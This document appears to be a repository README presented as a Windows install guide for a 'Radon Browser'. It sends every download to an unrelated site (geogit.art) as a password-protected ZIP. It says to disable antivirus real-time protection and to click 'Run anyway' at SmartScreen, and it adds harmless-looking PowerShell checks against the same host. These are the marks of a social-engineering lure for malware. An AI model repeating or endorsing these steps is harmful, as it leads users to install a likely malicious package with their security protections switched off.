# Radon Browser — Windows Setup Guide

Install and configure Radon Browser on Windows 10 / 11 — step-by-step setup and browser download.

<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — Radon Browser — Windows Setup Guide" width="520">
  </a>
</div>

## Download

1. Click the **Download Latest** image above to get the latest version
2. Open your **Downloads** folder
3. Copy the **archive password**
4. Right-click the ZIP → **Extract All** (or use 7-Zip / WinRAR) and paste the password when asked
5. If **antivirus** or Windows Security blocks the installer, temporarily turn off real-time protection or choose **Allow** — **turn protection back on after installation**
6. Open the extracted folder and run the **current version**

---

## Overview

This repository is a **Windows setup guide** for **Radon Browser — Windows Setup Guide**: what to download, how to extract the ZIP with the archive password, run the installer, and complete first-time configuration. No PowerShell required — use the **Download Latest** badge and **geogit.art** for the package.

---

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Click any **Download Latest** image in this README — follow the **Download** steps to get the package and run the installer. |
| Which Windows versions? | **Windows 10 and 11**, 64-bit. |
| UAC or SmartScreen? | Choose **Yes** / **Run anyway** if Windows prompts during install. |
| What does this repo cover? | **Radon Browser — Windows Setup Guide** on Windows — install and first-run setup. |
| Is this an official build? | Follow vendor terms; this repo documents Windows install only. |

---

## Features

- Desktop browsing on Windows 10 / 11
- Privacy-focused options (product-specific)
- Standard install and update flow
- Bookmark and profile support
- Download steps documented in this repo

---

## Use cases

- Private browsing on Windows
- Secondary browser profile
- Testing sites on desktop

---

## Developer reference

Optional checks for support (install does not require PowerShell).

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "radon-browser-windows-setup-guide"
$BuildLabel     = "2026.04"
```

**Endpoint reachability**

```powershell
Test-NetConnection geogit.art -Port 443
try {
  Invoke-WebRequest https://geogit.art/health -UseBasicParsing -Method Head -TimeoutSec 15 |
    Select-Object StatusCode, StatusDescription
} catch { $_.Exception.Message }
```

**Post-install**

```powershell
Get-Process -Name "Radon*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

---

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |


<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — Radon Browser — Windows Setup Guide" width="520">
  </a>
</div>

---

## Topics

`radon-browser-windows-setup-guide` · `radon-windows` · `windows-10` · `windows-11` · `windows-desktop` · `web-browser` · `privacy-browser` · `windows-browser` · `radon-software` · `radon-2026` · `desktop-software` · `windows-software`

---

## License

This repository describes installation and usage of third-party **web browser** software on Windows. Comply with vendor licensing and your local laws.
